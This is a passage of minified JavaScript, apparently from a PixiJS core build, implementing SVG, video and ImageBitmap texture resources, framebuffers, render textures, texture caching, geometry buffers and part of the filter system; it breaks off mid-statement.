e(e,i){var r=this;return i=i||{},(r=t.call(this,Fl.ADAPTER.createCanvas())||this)._width=0,r._height=0,r.svg=e,r.scale=i.scale||1,r._overrideWidth=i.width,r._overrideHeight=i.height,r._resolve=null,r._crossorigin=i.crossorigin,r._load=null,!1!==i.autoLoad&&r.load(),r}return Hc(e,t),e.prototype.load=function(){var t=this;return this._load||(this._load=new Promise((function(i){if(t._resolve=function(){t.resize(t.source.width,t.source.height),i(t)},e.SVG_XML.test(t.svg.trim())){if(!btoa)throw new Error("Your browser doesn't support base64 conversions.");t.svg="data:image/svg+xml;base64,"+btoa(unescape(encodeURIComponent(t.svg)))}t._loadSvg()}))),this._load},e.prototype._loadSvg=function(){var t=this,e=new Image;qc.crossOrigin(e,this.svg,this._crossorigin),e.src=this.svg,e.onerror=function(i){t._resolve&&(e.onerror=null,t.onError.emit(i))},e.onload=function(){if(t._resolve){var i=e.width,r=e.height;if(!i||!r)throw new Error("The SVG image must have width and height defined (in pixels), canvas API needs them.");var n=i*t.scale,s=r*t.scale;(t._overrideWidth||t._overrideHeight)&&(n=t._overrideWidth||t._overrideHeight/r*i,s=t._overrideHeight||t._overrideWidth/i*r),n=Math.round(n),s=Math.round(s);var o=t.source;o.width=n,o.height=s,o._pixiId="canvas_"+Jl(),o.getContext("2d").drawImage(e,0,0,i,r,0,0,n,s),t._resolve(),t._resolve=null}}},e.getSize=function(t){var i=e.SVG_SIZE.exec(t),r={};return i&&(r[i[1]]=Math.round(parseFloat(i[3])),r[i[5]]=Math.round(parseFloat(i[7]))),r},e.prototype.dispose=function(){t.prototype.dispose.call(this),this._resolve=null,this._crossorigin=null},e.test=function(t,i){return"svg"===i||"string"==typeof t&&/^data:image\/svg\+xml(;(charset=utf8|utf8))?;base64/.test(t)||"string"==typeof t&&e.SVG_XML.test(t)},e.SVG_XML=/^(<\?xml[^?]+\?>)?\s*(<!--[^(-->)]*-->)?\s*\<svg/m,e.SVG_SIZE=/<svg[^>]*(?:\s(width|height)=('|")(\d*(?:\.\d+)?)(?:px)?('|"))[^>]*(?:\s(width|height)=('|")(\d*(?:\.\d+)?)(?:px)?('|"))[^>]*>/i,e}(qc),td=function(t){function e(i,r){var n=this;if(r=r||{},!(i instanceof HTMLVideoElement)){var s=document.createElement("video");s.setAttribute("preload","auto"),s.setAttribute("webkit-playsinline",""),s.setAttribute("playsinline",""),"string"==typeof i&&(i=[i]);var o=i[0].src||i[0];qc.crossOrigin(s,o,r.crossorigin);for(var a=0;a<i.length;++a){var h=document.createElement("source"),u=i[a],l=u.src,c=u.mime,d=(l=l||i[a]).split("?").shift().toLowerCase(),p=d.slice(d.lastIndexOf(".")+1);c=c||e.MIME_TYPES[p]||"video/"+p,h.src=l,h.type=c,s.appendChild(h)}i=s}return(n=t.call(this,i)||this).noSubImage=!0,n._autoUpdate=!0,n._isConnectedToTicker=!1,n._updateFPS=r.updateFPS||0,n._msToNextUpdate=0,n.autoPlay=!1!==r.autoPlay,n._load=null,n._resolve=null,n._onCanPlay=n._onCanPlay.bind(n),n._onError=n._onError.bind(n),!1!==r.autoLoad&&n.load(),n}return Hc(e,t),e.prototype.update=function(e){if(!this.destroyed){var i=gc.shared.elapsedMS*this.source.playbackRate;this._msToNextUpdate=Math.floor(this._msToNextUpdate-i),(!this._updateFPS||this._msToNextUpdate<=0)&&(t.prototype.update.call(this),this._msToNextUpdate=this._updateFPS?Math.floor(1e3/this._updateFPS):0)}},e.prototype.load=function(){var t=this;if(this._load)return this._load;var e=this.source;return(e.readyState===e.HAVE_ENOUGH_DATA||e.readyState===e.HAVE_FUTURE_DATA)&&e.width&&e.height&&(e.complete=!0),e.addEventListener("play",this._onPlayStart.bind(this)),e.addEventListener("pause",this._onPlayStop.bind(this)),this._isSourceReady()?this._onCanPlay():(e.addEventListener("canplay",this._onCanPlay),e.addEventListener("canplaythrough",this._onCanPlay),e.addEventListener("error",this._onError,!0)),this._load=new Promise((function(i){t.valid?i(t):(t._resolve=i,e.load())})),this._load},e.prototype._onError=function(t){this.source.removeEventListener("error",this._onError,!0),this.onError.emit(t)},e.prototype._isSourcePlaying=function(){var t=this.source;return t.currentTime>0&&!1===t.paused&&!1===t.ended&&t.readyState>2},e.prototype._isSourceReady=function(){var t=this.source;return 3===t.readyState||4===t.readyState},e.prototype._onPlayStart=function(){this.valid||this._onCanPlay(),this.autoUpdate&&!this._isConnectedToTicker&&(gc.shared.add(this.update,this),this._isConnectedToTicker=!0)},e.prototype._onPlayStop=function(){this._isConnectedToTicker&&(gc.shared.remove(this.update,this),this._isConnectedToTicker=!1)},e.prototype._onCanPlay=function(){var t=this.source;t.removeEventListener("canplay",this._onCanPlay),t.removeEventListener("canplaythrough",this._onCanPlay);var e=this.valid;this.resize(t.videoWidth,t.videoHeight),!e&&this._resolve&&(this._resolve(this),this._resolve=null),this._isSourcePlaying()?this._onPlayStart():this.autoPlay&&t.play()},e.prototype.dispose=function(){this._isConnectedToTicker&&(gc.shared.remove(this.update,this),this._isConnectedToTicker=!1);var e=this.source;e&&(e.removeEventListener("error",this._onError,!0),e.pause(),e.src="",e.load()),t.prototype.dispose.call(this)},Object.defineProperty(e.prototype,"autoUpdate",{get:function(){return this._autoUpdate},set:function(t){t!==this._autoUpdate&&(this._autoUpdate=t,!this._autoUpdate&&this._isConnectedToTicker?(gc.shared.remove(this.update,this),this._isConnectedToTicker=!1):this._autoUpdate&&!this._isConnectedToTicker&&this._isSourcePlaying()&&(gc.shared.add(this.update,this),this._isConnectedToTicker=!0))},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"updateFPS",{get:function(){return this._updateFPS},set:function(t){t!==this._updateFPS&&(this._updateFPS=t)},enumerable:!1,configurable:!0}),e.test=function(t,i){return globalThis.HTMLVideoElement&&t instanceof HTMLVideoElement||e.TYPES.indexOf(i)>-1},e.TYPES=["mp4","m4v","webm","ogg","ogv","h264","avi","mov"],e.MIME_TYPES={ogv:"video/ogg",mov:"video/quicktime",m4v:"video/mp4"},e}(qc),ed=function(t){function e(e){return t.call(this,e)||this}return Hc(e,t),e.test=function(t){return!!globalThis.createImageBitmap&&"undefined"!=typeof ImageBitmap&&t instanceof ImageBitmap},e}(qc);Uc.push(Qc,ed,Zc,td,Jc,Xc,Kc,Yc);var id={__proto__:null,Resource:Vc,BaseImageResource:qc,INSTALLED:Uc,autoDetectResource:kc,AbstractMultiResource:Wc,ArrayResource:Yc,BufferResource:Xc,CanvasResource:Zc,CubeResource:Kc,ImageResource:Qc,SVGResource:Jc,VideoResource:td,ImageBitmapResource:ed},rd=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return Hc(e,t),e.prototype.upload=function(t,e,i){var r=t.gl;r.pixelStorei(r.UNPACK_PREMULTIPLY_ALPHA_WEBGL,e.alphaMode===ul.UNPACK);var n=e.realWidth,s=e.realHeight;return i.width===n&&i.height===s?r.texSubImage2D(e.target,0,0,0,n,s,e.format,i.type,this.data):(i.width=n,i.height=s,r.texImage2D(e.target,0,i.internalFormat,n,s,0,e.format,i.type,this.data)),!0},e}(Xc),nd=function(){function t(t,e){this.width=Math.round(t||100),this.height=Math.round(e||100),this.stencil=!1,this.depth=!1,this.dirtyId=0,this.dirtyFormat=0,this.dirtySize=0,this.depthTexture=null,this.colorTextures=[],this.glFramebuffers={},this.disposeRunner=new dc("disposeFramebuffer"),this.multisample=gl.NONE}return Object.defineProperty(t.prototype,"colorTexture",{get:function(){return this.colorTextures[0]},enumerable:!1,configurable:!0}),t.prototype.addColorTexture=function(t,e){return void 0===t&&(t=0),this.colorTextures[t]=e||new $c(null,{scaleMode:ol.NEAREST,resolution:1,mipmap:hl.OFF,width:this.width,height:this.height}),this.dirtyId++,this.dirtyFormat++,this},t.prototype.addDepthTexture=function(t){return this.depthTexture=t||new $c(new rd(null,{width:this.width,height:this.height}),{scaleMode:ol.NEAREST,resolution:1,width:this.width,height:this.height,mipmap:hl.OFF,format:il.DEPTH_COMPONENT,type:nl.UNSIGNED_SHORT}),this.dirtyId++,this.dirtyFormat++,this},t.prototype.enableDepth=function(){return this.depth=!0,this.dirtyId++,this.dirtyFormat++,this},t.prototype.enableStencil=function(){return this.stencil=!0,this.dirtyId++,this.dirtyFormat++,this},t.prototype.resize=function(t,e){if(t=Math.round(t),e=Math.round(e),t!==this.width||e!==this.height){this.width=t,this.height=e,this.dirtyId++,this.dirtySize++;for(var i=0;i<this.colorTextures.length;i++){var r=this.colorTextures[i],n=r.resolution;r.setSize(t/n,e/n)}this.depthTexture&&(n=this.depthTexture.resolution,this.depthTexture.setSize(t/n,e/n))}},t.prototype.dispose=function(){this.disposeRunner.emit(this,!1)},t.prototype.destroyDepthTexture=function(){this.depthTexture&&(this.depthTexture.destroy(),this.depthTexture=null,++this.dirtyId,++this.dirtyFormat)},t}(),sd=function(t){function e(e){void 0===e&&(e={});var i=this;if("number"==typeof e){var r=arguments[0],n=arguments[1],s=arguments[2],o=arguments[3];e={width:r,height:n,scaleMode:s,resolution:o}}return e.width=e.width||100,e.height=e.height||100,e.multisample=void 0!==e.multisample?e.multisample:gl.NONE,(i=t.call(this,null,e)||this).mipmap=hl.OFF,i.valid=!0,i.clearColor=[0,0,0,0],i.framebuffer=new nd(i.realWidth,i.realHeight).addColorTexture(0,i),i.framebuffer.multisample=e.multisample,i.maskStack=[],i.filterStack=[{}],i}return Hc(e,t),e.prototype.resize=function(t,e){this.framebuffer.resize(t*this.resolution,e*this.resolution),this.setRealSize(this.framebuffer.width,this.framebuffer.height)},e.prototype.dispose=function(){this.framebuffer.dispose(),t.prototype.dispose.call(this)},e.prototype.destroy=function(){t.prototype.destroy.call(this),this.framebuffer.destroyDepthTexture(),this.framebuffer=null},e}($c),od=function(){function t(){this.x0=0,this.y0=0,this.x1=1,this.y1=0,this.x2=1,this.y2=1,this.x3=0,this.y3=1,this.uvsFloat32=new Float32Array(8)}return t.prototype.set=function(t,e,i){var r=e.width,n=e.height;if(i){var s=t.width/2/r,o=t.height/2/n,a=t.x/r+s,h=t.y/n+o;i=Lc.add(i,Lc.NW),this.x0=a+s*Lc.uX(i),this.y0=h+o*Lc.uY(i),i=Lc.add(i,2),this.x1=a+s*Lc.uX(i),this.y1=h+o*Lc.uY(i),i=Lc.add(i,2),this.x2=a+s*Lc.uX(i),this.y2=h+o*Lc.uY(i),i=Lc.add(i,2),this.x3=a+s*Lc.uX(i),this.y3=h+o*Lc.uY(i)}else this.x0=t.x/r,this.y0=t.y/n,this.x1=(t.x+t.width)/r,this.y1=t.y/n,this.x2=(t.x+t.width)/r,this.y2=(t.y+t.height)/n,this.x3=t.x/r,this.y3=(t.y+t.height)/n;this.uvsFloat32[0]=this.x0,this.uvsFloat32[1]=this.y0,this.uvsFloat32[2]=this.x1,this.uvsFloat32[3]=this.y1,this.uvsFloat32[4]=this.x2,this.uvsFloat32[5]=this.y2,this.uvsFloat32[6]=this.x3,this.uvsFloat32[7]=this.y3},t.prototype.toString=function(){return"[@pixi/core:TextureUvs x0="+this.x0+" y0="+this.y0+" x1="+this.x1+" y1="+this.y1+" x2="+this.x2+" y2="+this.y2+" x3="+this.x3+" y3="+this.y3+"]"},t}(),ad=new od;function hd(t){t.destroy=function(){},t.on=function(){},t.once=function(){},t.emit=function(){}}var ud=function(t){function e(i,r,n,s,o,a){var h=t.call(this)||this;if(h.noFrame=!1,r||(h.noFrame=!0,r=new bc(0,0,1,1)),i instanceof e&&(i=i.baseTexture),h.baseTexture=i,h._frame=r,h.trim=s,h.valid=!1,h._uvs=ad,h.uvMatrix=null,h.orig=n||r,h._rotate=Number(o||0),!0===o)h._rotate=2;else if(h._rotate%2!=0)throw new Error("attempt to use diamond-shaped UVs. If you are sure, set rotation manually");return h.defaultAnchor=a?new xc(a.x,a.y):new xc(0,0),h._updateID=0,h.textureCacheIds=[],i.valid?h.noFrame?i.valid&&h.onBaseTextureUpdated(i):h.frame=r:i.once("loaded",h.onBaseTextureUpdated,h),h.noFrame&&i.on("update",h.onBaseTextureUpdated,h),h}return Hc(e,t),e.prototype.update=function(){this.baseTexture.resource&&this.baseTexture.resource.update()},e.prototype.onBaseTextureUpdated=function(t){if(this.noFrame){if(!this.baseTexture.valid)return;this._frame.width=t.width,this._frame.height=t.height,this.valid=!0,this.updateUvs()}else this.frame=this._frame;this.emit("update",this)},e.prototype.destroy=function(t){if(this.baseTexture){if(t){var i=this.baseTexture.resource;i&&i.url&&nc[i.url]&&e.removeFromCache(i.url),this.baseTexture.destroy()}this.baseTexture.off("loaded",this.onBaseTextureUpdated,this),this.baseTexture.off("update",this.onBaseTextureUpdated,this),this.baseTexture=null}this._frame=null,this._uvs=null,this.trim=null,this.orig=null,this.valid=!1,e.removeFromCache(this),this.textureCacheIds=null},e.prototype.clone=function(){var t=this._frame.clone(),i=this._frame===this.orig?t:this.orig.clone(),r=new e(this.baseTexture,!this.noFrame&&t,i,this.trim&&this.trim.clone(),this.rotate,this.defaultAnchor);return this.noFrame&&(r._frame=t),r},e.prototype.updateUvs=function(){this._uvs===ad&&(this._uvs=new od),this._uvs.set(this._frame,this.baseTexture,this.rotate),this._updateID++},e.from=function(t,i,r){void 0===i&&(i={}),void 0===r&&(r=Fl.STRICT_TEXTURE_CACHE);var n="string"==typeof t,s=null;if(n)s=t;else if(t instanceof $c){if(!t.cacheId){var o=i&&i.pixiIdPrefix||"pixiid";t.cacheId=o+"-"+Jl(),$c.addToCache(t,t.cacheId)}s=t.cacheId}else t._pixiId||(o=i&&i.pixiIdPrefix||"pixiid",t._pixiId=o+"_"+Jl()),s=t._pixiId;var a=nc[s];if(n&&r&&!a)throw new Error('The cacheId "'+s+'" does not exist in TextureCache.');return a||t instanceof $c?!a&&t instanceof $c&&(a=new e(t),e.addToCache(a,s)):(i.resolution||(i.resolution=oc(t)),(a=new e(new $c(t,i))).baseTexture.cacheId=s,$c.addToCache(a.baseTexture,s),e.addToCache(a,s)),a},e.fromURL=function(t,i){var r=Object.assign({autoLoad:!1},null==i?void 0:i.resourceOptions),n=e.from(t,Object.assign({resourceOptions:r},i),!1),s=n.baseTexture.resource;return n.baseTexture.valid?Promise.resolve(n):s.load().then((function(){return Promise.resolve(n)}))},e.fromBuffer=function(t,i,r,n){return new e($c.fromBuffer(t,i,r,n))},e.fromLoader=function(t,i,r,n){var s=new $c(t,Object.assign({scaleMode:Fl.SCALE_MODE,resolution:oc(i)},n)),o=s.resource;o instanceof Qc&&(o.url=i);var a=new e(s);return r||(r=i),$c.addToCache(a.baseTexture,r),e.addToCache(a,r),r!==i&&($c.addToCache(a.baseTexture,i),e.addToCache(a,i)),a.baseTexture.valid?Promise.resolve(a):new Promise((function(t){a.baseTexture.once("loaded",(function(){return t(a)}))}))},e.addToCache=function(t,e){e&&(-1===t.textureCacheIds.indexOf(e)&&t.textureCacheIds.push(e),nc[e]&&console.warn("Texture added to the cache with an id ["+e+"] that already had an entry"),nc[e]=t)},e.removeFromCache=function(t){if("string"==typeof t){var e=nc[t];if(e){var i=e.textureCacheIds.indexOf(t);return i>-1&&e.textureCacheIds.splice(i,1),delete nc[t],e}}else if(t&&t.textureCacheIds){for(var r=0;r<t.textureCacheIds.length;++r)nc[t.textureCacheIds[r]]===t&&delete nc[t.textureCacheIds[r]];return t.textureCacheIds.length=0,t}return null},Object.defineProperty(e.prototype,"resolution",{get:function(){return this.baseTexture.resolution},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"frame",{get:function(){return this._frame},set:function(t){this._frame=t,this.noFrame=!1;var e=t.x,i=t.y,r=t.width,n=t.height,s=e+r>this.baseTexture.width,o=i+n>this.baseTexture.height;if(s||o){var a=s&&o?"and":"or",h="X: "+e+" + "+r+" = "+(e+r)+" > "+this.baseTexture.width,u="Y: "+i+" + "+n+" = "+(i+n)+" > "+this.baseTexture.height;throw new Error("Texture Error: frame does not fit inside the base Texture dimensions: "+h+" "+a+" "+u)}this.valid=r&&n&&this.baseTexture.valid,this.trim||this.rotate||(this.orig=t),this.valid&&this.updateUvs()},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"rotate",{get:function(){return this._rotate},set:function(t){this._rotate=t,this.valid&&this.updateUvs()},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"width",{get:function(){return this.orig.width},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"height",{get:function(){return this.orig.height},enumerable:!1,configurable:!0}),e.prototype.castToBaseTexture=function(){return this.baseTexture},Object.defineProperty(e,"EMPTY",{get:function(){return e._EMPTY||(e._EMPTY=new e(new $c),hd(e._EMPTY),hd(e._EMPTY.baseTexture)),e._EMPTY},enumerable:!1,configurable:!0}),Object.defineProperty(e,"WHITE",{get:function(){if(!e._WHITE){var t=Fl.ADAPTER.createCanvas(16,16),i=t.getContext("2d");t.width=16,t.height=16,i.fillStyle="white",i.fillRect(0,0,16,16),e._WHITE=new e($c.from(t)),hd(e._WHITE),hd(e._WHITE.baseTexture)}return e._WHITE},enumerable:!1,configurable:!0}),e}(Ll),ld=function(t){function e(e,i){var r=t.call(this,e,i)||this;return r.valid=!0,r.filterFrame=null,r.filterPoolKey=null,r.updateUvs(),r}return Hc(e,t),Object.defineProperty(e.prototype,"framebuffer",{get:function(){return this.baseTexture.framebuffer},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"multisample",{get:function(){return this.framebuffer.multisample},set:function(t){this.framebuffer.multisample=t},enumerable:!1,configurable:!0}),e.prototype.resize=function(t,e,i){void 0===i&&(i=!0);var r=this.baseTexture.resolution,n=Math.round(t*r)/r,s=Math.round(e*r)/r;this.valid=n>0&&s>0,this._frame.width=this.orig.width=n,this._frame.height=this.orig.height=s,i&&this.baseTexture.resize(n,s),this.updateUvs()},e.prototype.setResolution=function(t){var e=this.baseTexture;e.resolution!==t&&(e.setResolution(t),this.resize(e.width,e.height,!1))},e.create=function(t){for(var i=arguments,r=[],n=1;n<arguments.length;n++)r[n-1]=i[n];return"number"==typeof t&&(ec("6.0.0","Arguments (width, height, scaleMode, resolution) have been deprecated."),t={width:t,height:r[0],scaleMode:r[1],resolution:r[2]}),new e(new sd(t))},e}(ud),cd=function(){function t(t){this.texturePool={},this.textureOptions=t||{},this.enableFullScreen=!1,this._pixelsWidth=0,this._pixelsHeight=0}return t.prototype.createTexture=function(t,e,i){void 0===i&&(i=gl.NONE);var r=new sd(Object.assign({width:t,height:e,resolution:1,multisample:i},this.textureOptions));return new ld(r)},t.prototype.getOptimalTexture=function(t,e,i,r){var n;void 0===i&&(i=1),void 0===r&&(r=gl.NONE),t=Math.ceil(t*i-1e-6),e=Math.ceil(e*i-1e-6),this.enableFullScreen&&t===this._pixelsWidth&&e===this._pixelsHeight?n=r>1?-r:-1:(n=((65535&(t=Wl(t)))<<16|65535&(e=Wl(e)))>>>0,r>1&&(n+=4294967296*r)),this.texturePool[n]||(this.texturePool[n]=[]);var s=this.texturePool[n].pop();return s||(s=this.createTexture(t,e,r)),s.filterPoolKey=n,s.setResolution(i),s},t.prototype.getFilterTexture=function(t,e,i){var r=this.getOptimalTexture(t.width,t.height,e||t.resolution,i||gl.NONE);return r.filterFrame=t.filterFrame,r},t.prototype.returnTexture=function(t){var e=t.filterPoolKey;t.filterFrame=null,this.texturePool[e].push(t)},t.prototype.returnFilterTexture=function(t){this.returnTexture(t)},t.prototype.clear=function(t){if(t=!1!==t)for(var e in this.texturePool){var i=this.texturePool[e];if(i)for(var r=0;r<i.length;r++)i[r].destroy(!0)}this.texturePool={}},t.prototype.setScreenSize=function(t){if(t.width!==this._pixelsWidth||t.height!==this._pixelsHeight){for(var e in this.enableFullScreen=t.width>0&&t.height>0,this.texturePool)if(Number(e)<0){var i=this.texturePool[e];if(i)for(var r=0;r<i.length;r++)i[r].destroy(!0);this.texturePool[e]=[]}this._pixelsWidth=t.width,this._pixelsHeight=t.height}},t.SCREEN_KEY=-1,t}(),dd=function(){function t(t,e,i,r,n,s,o){void 0===e&&(e=0),void 0===i&&(i=!1),void 0===r&&(r=nl.FLOAT),this.buffer=t,this.size=e,this.normalized=i,this.type=r,this.stride=n,this.start=s,this.instance=o}return t.prototype.destroy=function(){this.buffer=null},t.from=function(e,i,r,n,s){return new t(e,i,r,n,s)},t}(),pd=0,fd=function(){function t(t,e,i){void 0===e&&(e=!0),void 0===i&&(i=!1),this.data=t||new Float32Array(1),this._glBuffers={},this._updateID=0,this.index=i,this.static=e,this.id=pd++,this.disposeRunner=new dc("disposeBuffer")}return t.prototype.update=function(t){t instanceof Array&&(t=new Float32Array(t)),this.data=t||this.data,this._updateID++},t.prototype.dispose=function(){this.disposeRunner.emit(this,!1)},t.prototype.destroy=function(){this.dispose(),this.data=null},Object.defineProperty(t.prototype,"index",{get:function(){return this.type===ml.ELEMENT_ARRAY_BUFFER},set:function(t){this.type=t?ml.ELEMENT_ARRAY_BUFFER:ml.ARRAY_BUFFER},enumerable:!1,configurable:!0}),t.from=function(e){return e instanceof Array&&(e=new Float32Array(e)),new t(e)},t}(),gd={Float32Array:Float32Array,Uint32Array:Uint32Array,Int32Array:Int32Array,Uint8Array:Uint8Array},md={5126:4,5123:2,5121:1},vd=0,_d={Float32Array:Float32Array,Uint32Array:Uint32Array,Int32Array:Int32Array,Uint8Array:Uint8Array,Uint16Array:Uint16Array},yd=function(){function t(t,e){void 0===t&&(t=[]),void 0===e&&(e={}),this.buffers=t,this.indexBuffer=null,this.attributes=e,this.glVertexArrayObjects={},this.id=vd++,this.instanced=!1,this.instanceCount=1,this.disposeRunner=new dc("disposeGeometry"),this.refCount=0}return t.prototype.addAttribute=function(t,e,i,r,n,s,o,a){if(void 0===i&&(i=0),void 0===r&&(r=!1),void 0===a&&(a=!1),!e)throw new Error("You must pass a buffer when creating an attribute");e instanceof fd||(e instanceof Array&&(e=new Float32Array(e)),e=new fd(e));var h=t.split("|");if(h.length>1){for(var u=0;u<h.length;u++)this.addAttribute(h[u],e,i,r,n);return this}var l=this.buffers.indexOf(e);return-1===l&&(this.buffers.push(e),l=this.buffers.length-1),this.attributes[t]=new dd(l,i,r,n,s,o,a),this.instanced=this.instanced||a,this},t.prototype.getAttribute=function(t){return this.attributes[t]},t.prototype.getBuffer=function(t){return this.buffers[this.getAttribute(t).buffer]},t.prototype.addIndex=function(t){return t instanceof fd||(t instanceof Array&&(t=new Uint16Array(t)),t=new fd(t)),t.type=ml.ELEMENT_ARRAY_BUFFER,this.indexBuffer=t,-1===this.buffers.indexOf(t)&&this.buffers.push(t),this},t.prototype.getIndex=function(){return this.indexBuffer},t.prototype.interleave=function(){if(1===this.buffers.length||2===this.buffers.length&&this.indexBuffer)return this;var t,e=[],i=[],r=new fd;for(t in this.attributes){var n=this.attributes[t],s=this.buffers[n.buffer];e.push(s.data),i.push(n.size*md[n.type]/4),n.buffer=0}for(r.data=function(t,e){for(var i=0,r=0,n={},s=0;s<t.length;s++)r+=e[s],i+=t[s].length;var o=new ArrayBuffer(4*i),a=null,h=0;for(s=0;s<t.length;s++){var u=e[s],l=t[s],c=$l(l);n[c]||(n[c]=new gd[c](o)),a=n[c];for(var d=0;d<l.length;d++)a[(d/u|0)*r+h+d%u]=l[d];h+=u}return new Float32Array(o)}(e,i),t=0;t<this.buffers.length;t++)this.buffers[t]!==this.indexBuffer&&this.buffers[t].destroy();return this.buffers=[r],this.indexBuffer&&this.buffers.push(this.indexBuffer),this},t.prototype.getSize=function(){for(var t in this.attributes){var e=this.attributes[t];return this.buffers[e.buffer].data.length/(e.stride/4||e.size)}return 0},t.prototype.dispose=function(){this.disposeRunner.emit(this,!1)},t.prototype.destroy=function(){this.dispose(),this.buffers=null,this.indexBuffer=null,this.attributes=null},t.prototype.clone=function(){for(var e=new t,i=0;i<this.buffers.length;i++)e.buffers[i]=new fd(this.buffers[i].data.slice(0));for(var i in this.attributes){var r=this.attributes[i];e.attributes[i]=new dd(r.buffer,r.size,r.normalized,r.type,r.stride,r.start,r.instance)}return this.indexBuffer&&(e.indexBuffer=e.buffers[this.buffers.indexOf(this.indexBuffer)],e.indexBuffer.type=ml.ELEMENT_ARRAY_BUFFER),e},t.merge=function(e){for(var i,r=new t,n=[],s=[],o=[],a=0;a<e.length;a++){i=e[a];for(var h=0;h<i.buffers.length;h++)s[h]=s[h]||0,s[h]+=i.buffers[h].data.length,o[h]=0}for(a=0;a<i.buffers.length;a++)n[a]=new(_d[$l(i.buffers[a].data)])(s[a]),r.buffers[a]=new fd(n[a]);for(a=0;a<e.length;a++)for(i=e[a],h=0;h<i.buffers.length;h++)n[h].set(i.buffers[h].data,o[h]),o[h]+=i.buffers[h].data.length;if(r.attributes=i.attributes,i.indexBuffer){r.indexBuffer=r.buffers[i.buffers.indexOf(i.indexBuffer)],r.indexBuffer.type=ml.ELEMENT_ARRAY_BUFFER;var u=0,l=0,c=0,d=0;for(a=0;a<i.buffers.length;a++)if(i.buffers[a]!==i.indexBuffer){d=a;break}for(var a in i.attributes){var p=i.attributes[a];(0|p.buffer)===d&&(l+=p.size*md[p.type]/4)}for(a=0;a<e.length;a++){var f=e[a].indexBuffer.data;for(h=0;h<f.length;h++)r.indexBuffer.data[h+c]+=u;u+=e[a].buffers[d].data.length/l,c+=f.length}}return r},t}(),xd=function(t){function e(){var e=t.call(this)||this;return e.addAttribute("aVertexPosition",new Float32Array([0,0,1,0,1,1,0,1])).addIndex([0,1,3,2]),e}return Hc(e,t),e}(yd),Ed=function(t){function e(){var e=t.call(this)||this;return e.vertices=new Float32Array([-1,-1,1,-1,1,1,-1,1]),e.uvs=new Float32Array([0,0,1,0,1,1,0,1]),e.vertexBuffer=new fd(e.vertices),e.uvBuffer=new fd(e.uvs),e.addAttribute("aVertexPosition",e.vertexBuffer).addAttribute("aTextureCoord",e.uvBuffer).addIndex([0,1,2,0,2,3]),e}return Hc(e,t),e.prototype.map=function(t,e){var i=0,r=0;return this.uvs[0]=i,this.uvs[1]=r,this.uvs[2]=i+e.width/t.width,this.uvs[3]=r,this.uvs[4]=i+e.width/t.width,this.uvs[5]=r+e.height/t.height,this.uvs[6]=i,this.uvs[7]=r+e.height/t.height,i=e.x,r=e.y,this.vertices[0]=i,this.vertices[1]=r,this.vertices[2]=i+e.width,this.vertices[3]=r,this.vertices[4]=i+e.width,this.vertices[5]=r+e.height,this.vertices[6]=i,this.vertices[7]=r+e.height,this.invalidate(),this},e.prototype.invalidate=function(){return this.vertexBuffer._updateID++,this.uvBuffer._updateID++,this},e}(yd),bd=0,Td=function(){function t(t,e,i){this.group=!0,this.syncUniforms={},this.dirtyId=0,this.id=bd++,this.static=!!e,this.ubo=!!i,t instanceof fd?(this.buffer=t,this.buffer.type=ml.UNIFORM_BUFFER,this.autoManage=!1,this.ubo=!0):(this.uniforms=t,this.ubo&&(this.buffer=new fd(new Float32Array(1)),this.buffer.type=ml.UNIFORM_BUFFER,this.autoManage=!0))}return t.prototype.update=function(){this.dirtyId++,!this.autoManage&&this.buffer&&this.buffer.update()},t.prototype.add=function(e,i,r){if(this.ubo)throw new Error("[UniformGroup] uniform groups in ubo mode cannot be modified, or have uniform groups nested in them");this.uniforms[e]=new t(i,r)},t.from=function(e,i,r){return new t(e,i,r)},t.uboFrom=function(e,i){return new t(e,null==i||i,!0)},t}(),Dd=function(){function t(){this.renderTexture=null,this.target=null,this.legacy=!1,this.resolution=1,this.multisample=gl.NONE,this.sourceFrame=new bc,this.destinationFrame=new bc,this.bindingSourceFrame=new bc,this.bindingDestinationFrame=new bc,this.filters=[],this.transform=null}return t.prototype.clear=function(){this.target=null,this.filters=null,this.renderTexture=null},t}(),wd=[new xc,new xc,new xc,new xc],Sd=new Cc,Ad=function(){function t(t){this.renderer=t,this.defaultFilterStack=[{}],this.texturePool=new cd,this.texturePool.setScreenSize(t.view),this.statePool=[],this.quad=new xd,this.quadUv=new Ed,this.tempRect=new bc,this.activeState={},this.globalUniforms=new Td({outputFrame:new bc,inputSize:new Float32Array(4),inputPixel:new Float32Array(4),inputClamp:new Float32Array(4),resolution:1,filterArea:new Float32Array(4),filterClamp:new Float32Array(4)},!0),this.forceClear=!1,this.useMaxPadding=!1}return t.prototype.push=function(t,e){for(var i,r,n=this.renderer,s=this.defaultFilterStack,o=this.statePool.pop()||new Dd,a=this.renderer.renderTexture,h=e[0].resolution,u=e[0].multisample,l=e[0].padding,c=e[0].autoFit,d=null===(i=e[0].legacy)||void 0===i||i,p=1;p<e.length;p++){var f=e[p];h=Math.min(h,f.resolution),u=Math.min(u,f.multisample),l=this.useMaxPadding?Math.max(l,f.padding):l+f.padding,c=c&&f.autoFit,d=d||null===(r=f.legacy)||void 0===r||r}1===s.length&&(this.defaultFilterStack[0].renderTexture=a.current),s.push(o),o.resolution=h,o.multisample=u,o.legacy=d,o.target=t,o.sourceFrame.copyFrom(t.filterArea||t.getBounds(!0)),o.sourceFrame.pad(l);var g=this.tempRect.copyFrom(a.sourceFrame);n.projection.transform&&this.transformAABB(Sd.copyFrom(n.projection.transform).invert(),g),c?(o.sourceFrame.fit(g),(o.sourceFrame.width<=0||o.sourceFrame.height<=0)&&(o.sourceFrame.width=0,o.sourceFrame.height=0)):o.sourceFrame.intersects(g)||(o.sourceFrame.width=0,o.sourceFrame.height=0),this.roundFrame(o.sourceFrame,a.current?a.current.resolution:n.resolution,a.sourceFrame,a.destinationFrame,n.projection.transform),o.renderTexture=this.getOptimalFilterTexture(o.sourceFrame.width,o.sourceFrame.height,h,u),o.filters=e,o.destinationFrame.width=o.renderTexture.width,o.destinationFrame.height=o.renderTexture.height;var 